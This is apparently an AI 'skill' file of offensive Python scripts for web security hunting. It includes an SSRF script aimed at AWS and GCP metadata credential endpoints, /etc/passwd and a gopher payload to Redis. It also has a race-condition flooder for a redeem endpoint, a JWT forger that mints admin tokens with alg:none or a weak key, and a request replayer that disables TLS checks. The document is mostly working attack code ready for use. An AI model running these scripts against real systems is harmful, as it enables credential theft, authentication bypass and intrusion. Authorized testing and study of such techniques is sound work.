# SKILL: Python Hunting Scripts
## Version: 1.0 | Domain: scripting

---

## ASYNC HTTP PROBE
```python
#!/usr/bin/env python3
import asyncio, httpx, sys
SEM = asyncio.Semaphore(50)
async def probe(client, url):
    async with SEM:
        try:
            r = await client.get(url, timeout=7, follow_redirects=False)
            print(f"{r.status_code} {url} {r.headers.get('server','-')}", flush=True)
        except Exception as e: pass
async def main():
    urls = [l.strip() for l in sys.stdin if l.strip()]
    async with httpx.AsyncClient(verify=False, headers={'User-Agent':'Mozilla/5.0'}) as c:
        await asyncio.gather(*(probe(c,u) for u in urls))
asyncio.run(main())
```

## REDIRECT/SSRF EXFIL
```python
import requests
url = "https://target.tld/api/fetch?url={}"
payloads = [
    "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
    "http://[fd00:ec2::254]/latest/meta-data/",
    "http://metadata.google.internal/computeMetadata/v1/?recursive=true&alt=json",
    "file:///etc/passwd",
    "gopher://127.0.0.1:6379/_INFO%0d%0aQUIT%0d%0a",
]
for p in payloads:
    r = requests.get(url.format(p), headers={'Metadata-Flavor':'Google'}, timeout=10)
    if any(k in r.text for k in ['root:','SecretAccessKey','metadata']):
        print(f"HIT: {p}\\n{r.text[:500]}")
```

## RACE CONDITION (singlepacket-style with httpx)
```python
import httpx, asyncio
async def hit(client):
    return await client.post('https://target/redeem', json={'code':'X'})
async def main():
    async with httpx.AsyncClient(http2=True, verify=False) as c:
        rs = await asyncio.gather(*(hit(c) for _ in range(30)))
    for r in rs: print(r.status_code, r.text[:80])
asyncio.run(main())
```

## JWT FORGER (alg:none / weak HS256)
```python
import jwt, json
header = {"alg": "none"}
payload = {"sub":"admin","exp":9999999999}
print(jwt.encode(payload, key="", algorithm="none"))
# Weak HS256
print(jwt.encode(payload, key="secret", algorithm="HS256"))
```

## BURP REPLAY HELPER
```python
import re, requests
raw = open('request.txt').read()
m = re.match(r'(GET|POST|PUT|DELETE) (\S+) HTTP', raw)
method, path = m.groups()
host = re.search(r'Host: (\S+)', raw).group(1)
body = raw.split('\\r\\n\\r\\n',1)[1] if '\\r\\n\\r\\n' in raw else ''
url = f'https://{host}{path}'
headers = {l.split(': ',1)[0]: l.split(': ',1)[1] for l in raw.split('\\r\\n')[1:] if ': ' in l}
r = requests.request(method, url, data=body, headers=headers, verify=False)
print(r.status_code, len(r.text))
```

## REFERENCES
Black Hat Python (Justin Seitz), httpx-py, requests-toolbelt
